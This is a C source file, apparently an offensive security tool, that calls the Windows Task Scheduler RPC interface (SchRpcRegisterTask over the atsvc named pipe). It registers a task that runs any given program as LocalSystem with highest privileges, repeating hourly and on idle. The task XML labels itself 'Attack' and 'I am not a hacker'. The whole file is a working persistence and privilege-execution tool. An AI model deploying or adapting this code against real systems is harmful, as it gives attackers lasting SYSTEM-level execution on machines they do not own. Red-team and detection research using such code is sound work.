#include <stdio.h>
#include <Windows.h>
#include "SchRpc.h"

#pragma comment(lib, "rpcrt4.lib")

#define ITASKSCHEDULERSERVICE_UUID L"86D35949-83C9-4044-B424-DB363231FD0C"
#define TASK_CREATE 2
#define TASK_LOGON_NONE 0

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}

VOID RegisterSchTask(wchar_t* filePath)
{
    RPC_WSTR stringBinding;
    RPC_STATUS rpcStatus;
    RPC_BINDING_HANDLE bindingHandle;
    HRESULT status;
    wchar_t* actualPath = NULL;
    TASK_XML_ERROR_INFO* errorInfo = NULL;
    RPC_SECURITY_QOS SecurityQOS = { 0 };
    wchar_t xmlBuffer[4096];

    static const wchar_t* xml =
        L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
        L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
        L"  <RegistrationInfo>\n"
        L"    <Author>not hacker</Author>\n"
        L"    <Description>Attack</Description>\n"
        L"    <URI>\I am not a hacker</URI>\n"
        L"  </RegistrationInfo>\n"
        L"  <Triggers>\n"
        L"    <RegistrationTrigger>\n"
        L"      <Repetition>\n"
        L"        <Interval>PT1H</Interval>\n"
        L"        <StopAtDurationEnd>false</StopAtDurationEnd>\n"
        L"      </Repetition>\n"
        L"      <Enabled>true</Enabled>\n"
        L"    </RegistrationTrigger>\n"
        L"    <IdleTrigger>\n"
        L"      <Enabled>true</Enabled>\n"
        L"    </IdleTrigger>\n"
        L"    <CalendarTrigger>\n"
        L"      <Repetition>\n"
        L"        <Interval>PT1H</Interval>\n"
        L"        <StopAtDurationEnd>false</StopAtDurationEnd>\n"
        L"      </Repetition>\n"
        L"      <StartBoundary>2021-10-11T11:00:00</StartBoundary>\n"
        L"      <Enabled>true</Enabled>\n"
        L"      <ScheduleByDay>\n"
        L"        <DaysInterval>1</DaysInterval>\n"
        L"      </ScheduleByDay>\n"
        L"    </CalendarTrigger>\n"
        L"  </Triggers>\n"
        L"  <Principals>\n"
        L"    <Principal id=\"LocalSystem\">\n"
        L"      <RunLevel>HighestAvailable</RunLevel>\n"
        L"      <UserId>S-1-5-18</UserId>\n"
        L"    </Principal>\n"
        L"  </Principals>\n"
        L"  <Settings>\n"
        L"    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
        L"    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n"
        L"    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n"
        L"    <AllowHardTerminate>true</AllowHardTerminate>\n"
        L"    <StartWhenAvailable>true</StartWhenAvailable>\n"
        L"    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n"
        L"    <IdleSettings>\n"
        L"      <StopOnIdleEnd>true</StopOnIdleEnd>\n"
        L"      <RestartOnIdle>false</RestartOnIdle>\n"
        L"    </IdleSettings>\n"
        L"    <AllowStartOnDemand>true</AllowStartOnDemand>\n"
        L"    <Enabled>true</Enabled>\n"
        L"    <Hidden>false</Hidden>\n"
        L"    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n"
        L"    <WakeToRun>false</WakeToRun>\n"
        L"    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>\n"
        L"    <Priority>7</Priority>\n"
        L"  </Settings>\n"
        L"  <Actions Context=\"LocalSystem\">\n"
        L"    <Exec>\n"
        L"      <Command>%s</Command>\n"
        L"    </Exec>\n"
        L"  </Actions>\n"
        L"</Task>";

    swprintf(xmlBuffer, 4096, xml, filePath);

    rpcStatus = RpcStringBindingComposeW(ITASKSCHEDULERSERVICE_UUID, L"ncacn_np", L"localhost", L"\\pipe\\atsvc", NULL, &stringBinding);
    if (rpcStatus == RPC_S_OK)
    {
        rpcStatus = RpcBindingFromStringBindingW(stringBinding, &bindingHandle);
        if (rpcStatus == RPC_S_OK)
        {
            SecurityQOS.Version = 1;
            SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
            SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
            SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

            rpcStatus = RpcBindingSetAuthInfoEx(bindingHandle, 0, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, 0xA, 0, RPC_C_AUTHZ_NONE, &SecurityQOS);
            if (rpcStatus == RPC_S_OK)
            {
                RpcTryExcept
                {

                    status = SchRpcRegisterTask(bindingHandle, L"\\I am not a hacker", xmlBuffer, TASK_CREATE, NULL, 0, 0, NULL, &actualPath, &errorInfo);
                    if (status == S_OK)
                    {
                        wprintf(L"[*] Create schedule task success! ActualPath: %s\n", actualPath);
                    }
                    else
                    {
                        wprintf(L"[!] SchRpcRegisterTask error: 0x%08X\n", status);
                    }
                }
                    RpcExcept(RPC_EXCEPTION)
                    wprintf(L"[!] RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
                RpcEndExcept
            }
            else wprintf(L"[!] RpcBindingSetAuthInfoEx error.\n");

        }
        else wprintf(L"[!] RpcBindingFromStringBindingW error.\n");


        RpcStringFreeW(&stringBinding);
    }
    else wprintf(L"[!] RpcStringBindingComposeW error.\n");
}


int wmain(int argc, wchar_t* argv[])
{
    if (argc == 2)
    {
        wprintf(L"[*] Trying to register a schtask that executes %s.\n", argv[1]);
        RegisterSchTask(argv[1]);
    }
    else wprintf(L"Usage: %s <FilePath>\n", argv[0]);

	return 0;
}